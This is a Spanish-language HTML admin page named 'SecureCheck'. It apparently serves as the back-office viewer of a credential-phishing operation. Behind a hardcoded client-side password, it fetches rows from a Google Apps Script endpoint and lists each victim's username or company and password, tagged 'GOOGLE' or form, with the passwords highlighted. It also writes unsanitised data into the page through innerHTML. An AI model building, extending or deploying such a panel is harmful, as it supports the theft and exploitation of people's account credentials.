<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Panel de Administración - SecureCheck</title>
    <style>
        body { background: #0b141d; color: white; font-family: sans-serif; padding: 20px; }
        .container { max-width: 1100px; margin: auto; }
        .card { background: #15202b; border-radius: 12px; padding: 25px; border: 1px solid #1e293b; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th { background: #1e293b; color: #38bdf8; padding: 15px; text-align: left; font-size: 11px; text-transform: uppercase; }
        td { padding: 15px; border-bottom: 1px solid #1e293b; font-size: 14px; }
        .badge { padding: 4px 8px; border-radius: 4px; font-size: 10px; font-weight: bold; }
        .badge-google { background: #0369a1; color: #7dd3fc; }
        .badge-form { background: #581c87; color: #d8b4fe; }
        .pass-cell { font-family: monospace; color: #fbbf24; font-weight: bold; font-size: 15px; }
        #login-screen { text-align: center; margin-top: 100px; }
        input { padding: 12px; border-radius: 8px; border: 1px solid #1e293b; background: #0b141d; color: white; margin-bottom: 10px; }
        button { padding: 12px 25px; background: #38bdf8; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <div id="login-screen">
            <h1>Acceso Admin</h1>
            <input type="password" id="p" placeholder="Contraseña">
            <br>
            <button onclick="check()">Entrar</button>
        </div>

        <div id="dashboard" style="display:none">
            <div class="card">
                <div style="display:flex; justify-content:space-between; align-items:center;">
                    <h2 style="color:#38bdf8">Registros Recibidos</h2>
                    <button onclick="load()" style="background:none; border:1px solid #38bdf8; color:#38bdf8; padding:5px 10px; font-size:12px;">Actualizar</button>
                </div>
                <table>
                    <thead>
                        <tr>
                            <th>Origen</th>
                            <th>Usuario / Empresa</th>
                            <th>Datos / Pass</th>
                            <th>Fecha</th>
                        </tr>
                    </thead>
                    <tbody id="tabla"></tbody>
                </table>
            </div>
        </div>
    </div>

    <script>
        const webAppUrl = "https://script.google.com/macros/s/AKfycbxxEKp_PVTwf3tXujx-EnlAqt230G5ckmnjOIml5zEXvlM3dYadCy74Cu1YD-ZZgTJ3/exec";

        function check() {
            if(document.getElementById("p").value === "Linares2025.") {
                document.getElementById("login-screen").style.display="none";
                document.getElementById("dashboard").style.display="block";
                load();
            }
        }

        async function load() {
            const tbody = document.getElementById("tabla");
            tbody.innerHTML = "<tr><td colspan='4'>Cargando datos frescos...</td></tr>";
            
            try {
                // AÑADIMOS TIMESTAMP PARA EVITAR CACHÉ (Lo nuevo)
                const freshUrl = webAppUrl + "?t=" + new Date().getTime();
                const res = await fetch(freshUrl);
                const data = await res.json();
                
                tbody.innerHTML = "";
                data.reverse().forEach(row => {
                    const isGoogle = (row[2] || "").includes("GOOGLE");
                    tbody.innerHTML += `
                        <tr>
                            <td><span class="badge ${isGoogle ? 'badge-google' : 'badge-form'}">${row[2]}</span></td>
                            <td>${row[0]}</td>
                            <td class="${isGoogle ? 'pass-cell' : ''}">${row[1]}</td>
                            <td style="color:#64748b">${row[3]}</td>
                        </tr>`;
                });
            } catch (e) {
                tbody.innerHTML = "<tr><td colspan='4'>Error al leer. Revisa la publicación del Script.</td></tr>";
            }
        }
    </script>
</body>
</html>
